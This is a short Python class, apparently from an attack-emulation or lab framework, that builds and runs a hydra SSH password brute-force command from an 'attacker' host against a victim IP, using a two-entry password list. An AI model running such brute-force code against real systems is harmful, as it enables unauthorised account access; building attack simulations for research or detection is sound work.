import logging
logger = logging.getLogger("[Action:BRUTE]")

class HydraBruteAction:
    def __init__(self, user="tcc", pass_list=("123456", "wrongpass"), output="exp_brute.hydra"):
        self.user = user
        self.pass_list = pass_list
        self.output = output

    def run(self, attacker_ssh, victim_ip: str):
        try:
            pass_pipe = "\\n".join(self.pass_list)
            cmd = f"IP={victim_ip}; hydra -l {self.user} -P <(printf '{pass_pipe}\\n') ssh://$IP -t 4 -f -I -o ~/{self.output}"
            logger.info(f"[BRUTE] Executando: {cmd}")
            attacker_ssh.run_command("attacker", cmd, timeout=600)
        except Exception as e:
            logger.error(f"[BRUTE] Falhou: {e}")
            raise
